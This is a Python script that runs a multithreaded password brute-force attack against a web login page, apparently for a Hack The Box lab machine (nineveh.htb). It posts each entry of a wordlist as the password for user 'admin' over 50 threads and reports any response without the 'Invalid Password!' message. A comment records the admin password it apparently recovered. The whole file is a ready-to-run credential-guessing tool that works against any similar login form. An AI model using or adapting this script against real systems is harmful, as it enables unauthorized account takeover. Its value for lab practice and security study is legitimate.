#!/usr/bin/python3 

import requests
from pwn import log
from concurrent.futures import ThreadPoolExecutor
import signal 
import os


# Valid Credentials
# User: admin
# Password: 1q2w3e4r5t


def ctrl_c(sig, frame):

    print('\n[!] Exiting...!')
    os._exit(0)

signal.signal(signal.SIGINT, ctrl_c)


def make_request(password):

    progress.status(password)

    payload = {
        'username':user,
        'password':password
    }

    response = requests.post(url, data=payload)


    if 'Invalid Password!' not in response.text: 
        progress.success(password)



if __name__ == '__main__':

    url = 'http://nineveh.htb/department/login.php' 
    user = 'admin'
    wordlist = 'passwords.txt'
    progress = log.progress('Password ({})'.format(user))


    with open(wordlist, 'r') as wordlist:    
        passwords = [word.rstrip() for word in wordlist]

#        for password in passwords: 
#            make_request(password)


        with ThreadPoolExecutor(max_workers=50) as executor:
            executor.map(make_request, passwords)

                                                    